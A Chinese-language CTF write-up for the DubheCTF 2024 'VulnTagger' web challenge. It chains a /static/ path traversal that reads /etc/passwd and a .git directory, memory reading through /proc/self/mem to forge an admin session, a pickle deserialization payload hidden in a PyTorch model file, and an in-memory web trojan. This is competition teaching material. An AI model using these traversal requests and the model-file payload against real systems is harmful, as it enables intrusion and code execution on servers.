# VulnTagger

Anime images tagger online, but vulnerable. (DubheCTF 2024)

## 题面

是黑盒题，题面只有环境地址。

题目是一款名为 VulnTagger 的图片标注工具，可以上传图片，并由预设的模型进行标注。

> [!NOTE]
> 这里的模型是来自于 DeepDabooru 的开源项目，[AUTOMATIC1111 把他移植到了 PyTorch](https://github.com/AUTOMATIC1111/TorchDeepDanbooru/)。

### 题目描述

> You're right, but "TorchDeepDanbooru" is an anime image labeling model trained by AUTOMATIC1111. The story takes place on a model inference interface written by a mysterious developer, where selected images are granted "tags" to guide information classification. You will play a role named "hacker", encountering PyTorch model weights in the process of image classification, and defeating information chaos with them to find back the lost accurate tags - meanwhile, gradually breaking the program's confidentiality and integrity.

<details>

<summary>Hint</summary>

> 1. 本题为传统 Web 题，不包含 AI 元素，请放心食用
> 2. 背景图片挺好看的，看看它从哪来？
> 3. 版本控制工具是个好东西，出题人很喜欢用。

</details>

## Writeup

> [!NOTE]
> 感觉泄露源码这里出的确实有点脑电波了，给各位师傅谢罪（土下座）

观察请求的路径，发现存在一个 `/static/` 路由，用来传送首页的背景图片。这个路由存在路径穿越，我们可以很容易地通过以下请求来读取 `/etc/passwd`：

```http
GET /static/../../../../../../../../etc/passwd HTTP/1.1
```

> [!TIP]
> 其实 `/static//etc/passwd` 也是可以的。

此时，我们可以用 GitHack 来读取源码。在 `/static/` 目录下，我们通过路径穿越等等手段找到`.git`目录，然后通过 GitHack 工具来读取源码。

```http
GET /static//proc/self/cwd/.git/HEAD HTTP/1.1
```

使用工具读取 `.git` 目录，我们可以得到源码来进行分析。

阅读代码，我们可以关注到存在一个`/admin`路由，它需要登录来访问。

```python
def authorization_middleware(credentials: CredentialsDep):
    if not SALTED_PASSWORD:
        logger.warning(
            "SALTED_PASSWORD not set, you will not be able to access admin page"
        )

    if credentials is not None and (
        compare_digest(credentials.username, "admin")
        and compare_digest(
            hashlib.sha256(
                f"{PASSWORD_SALT}{credentials.password}{PASSWORD_SALT}".encode()
            ).hexdigest(),
            SALTED_PASSWORD,
        )
    ):
        app.storage.browser["is_admin"] = True
    is_admin = app.storage.browser.get("is_admin", False)
    if not is_admin:
        raise HTTPException(
            status_code=401,
            detail="Unauthorized",
            headers={"WWW-Authenticate": "Basic"},
        )
    return is_admin
```

然而……`SALTED_PASSWORD` 是一个空值，我们无法通过正常的登录来访问这个路由。

通过源码审计，我们得知，`app.storage.browser` 是在用户的浏览器中存储的，我们只要获取到 secret 就能够登录：

```python
def main():
    from nicegui import ui_run

    ui_run.APP_IMPORT_STRING = "vulntagger:app"

    ui.run(
        host=environ.get("HOST"),
        port=int(environ.get("PORT", 8080)),
        title="VulnTagger",
        storage_secret=secrets.token_urlsafe(16),
        show=False,
        uvicorn_logging_level="info",
        log_config={...},
        access_log=True,
    )
```

其中，`secret` 是通过 `secrets.token_urlsafe(16)` 生成的，实际是是一个 22 位的字符串，满足 `[\w-]{22}`。

而由于静态文件的路由实现了`Range`请求，在内部对文件进行 seek 操作，我们可以通过遍历`/proc/self/mem`来读取内存中的数据，并且寻找满足要求的能够成功验证 token 的 secret。

读取 secret 伪造 token 的代码可以参考 [`mem_travesal.py`](./exploits/mem_travesal.py), 这里不再赘述。

修改 token 后我们应当能够成功访问到`/admin`路由。

在`/admin`路由中，我们可以看到一个上传新模型的功能，通过源码审计可以得知，PyTorch 的模型是通过 Pickle 序列化后进行持久化的，而在加载时如果不通过 `weights_only=True` 参数，就会导致反序列化攻击。

```python
payload_code = '__import__("os").system("touch /tmp/pwned")'

dic = OrderedDict()
dic.__reduce__ = lambda: (
    eval,
    (payload_code,),
)

torch.save(dic, "evil.pt")
```

在 RCE 之后，我们并没有办法直接得到 Flag。注意到[`bot.py`](./bot.py)文件，它会定时的构造包含特定请求头的请求，并且检查返回的结果是否符合预期。如果连续五次检查结果都符合预期，它将执行`/readflag`来将 Flag 发送到服务。

> [!TIP]
> 这其实就是题目描述中 _meanwhile, gradually breaking the program's confidentiality and integrity._ 的含义

此时，我们需要构造一个内存马，来为请求添加一个自己构造的中间件，以此来通过 Bot 的检查。具体构造请参考 [`evil_weight.py`](./exploits/evil_weight.py) 和 [`mem_trojan.py`](./exploits/mem_trojan.py)。
